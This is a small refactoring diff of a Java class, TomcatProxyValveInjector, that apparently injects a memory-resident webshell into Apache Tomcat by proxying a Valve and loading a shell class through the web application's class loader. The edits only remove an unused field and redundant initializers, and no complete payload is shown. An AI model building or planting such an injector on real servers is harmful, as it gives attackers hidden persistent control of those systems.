@@ -21,10 +21,9 @@ public class TomcatProxyValveInjector implements InvocationHandler {
     private Object rawValve;
     private Object proxyValve;
 
-    private static String urlPattern;
     private static String shellClassName;
     private static String shellClass;
-    private static boolean ok = false;
+    private static boolean ok;
 
     public TomcatProxyValveInjector() {
         if (ok) {
@@ -48,7 +47,6 @@ public class TomcatProxyValveInjector implements InvocationHandler {
         ok = true;
         shellClass = null;
         shellClassName = null;
-        urlPattern = null;
     }
 
     public TomcatProxyValveInjector(Object rawValve, Object proxyValve) {
@@ -121,7 +119,7 @@ public class TomcatProxyValveInjector implements InvocationHandler {
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz = null;
+        Class<?> clazz;
         try {
             clazz = classLoader.loadClass(shellClassName);
         } catch (Exception e) {
